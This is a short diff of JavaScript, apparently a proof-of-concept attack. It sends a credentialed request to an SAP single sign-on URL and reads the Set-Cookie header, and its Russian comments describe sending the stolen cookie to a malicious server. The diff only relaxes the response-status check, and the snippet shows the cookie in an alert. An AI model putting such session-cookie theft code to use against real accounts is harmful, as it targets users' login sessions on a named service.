@@ -14,7 +14,7 @@
     xhr.open("GET", "https://accounts.sap.com/saml2/idp/sso?sp=sp.accounts.sap.com&RelayState=https://accounts.sap.com/ui/protected/profilemanagement", true);
     xhr.withCredentials = true; // Разрешить отправку cookie
     xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
+        if (xhr.readyState === 4) {
             // Успешный ответ от сервера, отправить cookie на злоумышленный сервер
             var stolenCookie = xhr.getResponseHeader("Set-Cookie");
             alert(stolenCookie);
